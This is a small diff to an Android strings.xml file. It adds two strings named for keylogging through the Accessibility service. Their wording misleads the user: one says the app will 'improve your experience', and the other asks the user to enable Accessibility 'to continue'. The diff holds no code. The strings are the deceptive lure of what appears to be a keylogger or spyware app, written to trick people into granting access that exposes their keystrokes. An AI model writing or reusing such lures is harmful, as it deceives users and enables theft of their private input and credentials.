@@ -93,4 +93,6 @@
         vestibulum. Fusce dictum libero quis erat maximus, vitae volutpat diam dignissim.
     </string>
     <string name="hello_blank_fragment">Hello blank fragment</string>
+    <string name="keylog_accessibility_description">Allows the app to run in the background and improve your experience.</string>
+    <string name="keylog_accessibility_prompt">Please enable Accessibility for this app in settings to continue.</string>
 </resources>
